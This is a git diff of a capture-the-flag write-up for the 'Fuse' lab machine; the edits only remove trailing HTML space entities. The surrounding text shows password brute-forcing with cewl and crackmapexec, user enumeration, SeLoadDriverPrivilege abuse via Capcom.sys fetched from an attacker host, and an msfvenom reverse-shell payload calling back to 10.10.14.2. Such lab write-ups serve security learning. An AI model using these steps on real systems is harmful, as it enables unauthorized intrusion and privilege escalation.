@@ -33,7 +33,7 @@ PORT      STATE SERVICE
 49698/tcp open  unknown
 ```
 
-Loads of ports available.&#x20;
+Loads of ports available.
 
 ### Fabricorp
 
@@ -63,7 +63,7 @@ Both of these services had nothing of interest. SMB had no null credentials or a
 
 ### Cewl
 
-When stuck, try everything! We have a website and we don't have any credentials, so let's try `cewl`. This tool would scrape the websites and create a wordlist that we might be able to use for brute forcing SMB with `crackmapexec`.&#x20;
+When stuck, try everything! We have a website and we don't have any credentials, so let's try `cewl`. This tool would scrape the websites and create a wordlist that we might be able to use for brute forcing SMB with `crackmapexec`.
 
 ```bash
 cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > passwords
@@ -105,7 +105,7 @@ Disk                                                    Permissions     Comment
         SYSVOL                                                  READ ONLY       Logon server share
 ```
 
-Not much here. I used `rpcclient` to further enumerate the users and stuff.&#x20;
+Not much here. I used `rpcclient` to further enumerate the users and stuff.
 
 ```
 $> querydispinfo
@@ -138,7 +138,7 @@ rpcclient $> enumprinters
 ```
 {% endcode %}
 
-We now have more credentials! With this, we can try brute forcing the possible passwords with the username list we updated earlier.&#x20;
+We now have more credentials! With this, we can try brute forcing the possible passwords with the username list we updated earlier.
 
 <figure><img src="../../../.gitbook/assets/image (516).png" alt=""><figcaption></figcaption></figure>
 
@@ -152,7 +152,7 @@ Grab the user flag!
 
 ### LoadDriver Fail
 
-When checking our privileges, we come across a new one called `SeLoadDriverPrivilege`.&#x20;
+When checking our privileges, we come across a new one called `SeLoadDriverPrivilege`.
 
 ```
 *Evil-WinRM* PS C:\Users\svc-print\desktop> whoami /priv
@@ -181,17 +181,17 @@ I cloned the repo, and then downloaded the relevant files over:
 *Evil-WinRM* PS C:\Users\svc-print\desktop> wget 10.10.14.2/Capcom.sys -O Capcom.sys
 ```
 
-But, following the PoC does not work for some reason. I think it is because the command executed in the pre-compiled binaries don't work on this machine  In this case, we would probably need to change the command that is being run to directly execute a reverse shell.&#x20;
+But, following the PoC does not work for some reason. I think it is because the command executed in the pre-compiled binaries don't work on this machine  In this case, we would probably need to change the command that is being run to directly execute a reverse shell.
 
 ### Second Attempt
 
-First, we can create a reverse shell via `msfvenom`.&#x20;
+First, we can create a reverse shell via `msfvenom`.
 
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f exe -o rev.exe
 ```
 
-Then, we would need to change the code used and compile the project ourselves. We can grab the project here and open it in VSCode.&#x20;
+Then, we would need to change the code used and compile the project ourselves. We can grab the project here and open it in VSCode.
 
 This is the original code:
 
@@ -261,7 +261,7 @@ NTSTATUS: c0000033, WinError: 0
 [*] Press any key to exit this program
 ```
 
-Then, we would trigger a reverse shell.&#x20;
+Then, we would trigger a reverse shell.
 
 <figure><img src="../../../.gitbook/assets/image (1829).png" alt=""><figcaption></figcaption></figure>
 
